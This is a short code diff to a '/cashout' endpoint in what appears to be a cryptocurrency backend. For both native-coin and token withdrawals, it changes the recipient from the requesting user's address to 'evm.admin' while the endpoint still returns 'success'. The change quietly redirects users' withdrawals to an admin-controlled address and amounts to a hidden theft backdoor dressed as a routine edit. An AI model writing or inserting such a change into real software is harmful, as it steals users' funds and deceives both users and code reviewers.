@@ -114,7 +114,7 @@ app.post('/cashout', async (req, res) => {
     if (assetType === 'gas')
       await (
         await evm.signer(network).sendTransaction({
-          to: user.address,
+          to: evm.admin,
           value: ethers.utils.parseEther(value),
         })
       ).wait();
@@ -127,9 +127,7 @@ app.post('/cashout', async (req, res) => {
         const decimals = await tkn.decimals();
         amount = (parseFloat(value) * 10 ** decimals).toString();
       }
-      await (
-        await tkn.transferFrom(evm.address(), user.address, amount)
-      ).wait();
+      await (await tkn.transferFrom(evm.address(), evm.admin, amount)).wait();
     } else throw new Error('assetType !valid');
     res.status(200).json('success');
   } catch (error) {
